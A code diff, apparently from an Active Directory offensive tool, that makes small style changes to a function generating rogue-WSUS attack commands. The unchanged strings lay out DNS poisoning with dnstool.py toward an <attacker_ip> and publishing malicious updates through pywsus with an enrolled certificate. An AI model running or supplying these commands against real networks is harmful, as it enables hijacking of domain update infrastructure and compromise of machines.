@@ -49,7 +49,7 @@ def build_pywsus_publish_commands(
         f"# PFX (Subject/SAN = {target_fqdn}): {pfx}",
         "# 1) Optional: poison AD DNS so DC resolves your rogue WSUS host",
         f"#    dnstool.py -u '<owned_user>' -p '<pass>' --record {target_fqdn} --action add --data <attacker_ip>",
-        f"#    or: wsuks / SharpWSUS with machine account + SeMachineAccountPrivilege",
+        "#    or: wsuks / SharpWSUS with machine account + SeMachineAccountPrivilege",
         "# 2) Rogue WSUS publish (pywsus / wsuks) with enrolled PFX",
         f"python3 pywsus.py -s {base} -c '{pfx}' publish -t {target_fqdn}",
         f"# Alt with creds: python3 pywsus.py -u '<user>@{domain}' -p '<pass>' -s {base} -c '{pfx}' publish -t {target_fqdn}",
@@ -112,7 +112,11 @@ def run_wsus_cert_chain(
     if session.workspace is None:
         raise RuntimeError("no active workspace")
 
-    from admapper.core.connectivity import TargetUnreachableError, format_unreachable_message, require_target_reachable
+    from admapper.core.connectivity import (
+        TargetUnreachableError,
+        format_unreachable_message,
+        require_target_reachable,
+    )
     from admapper.models.workspace import OperationMode
 
     if enroll and session.workspace.mode == OperationMode.AUTO:
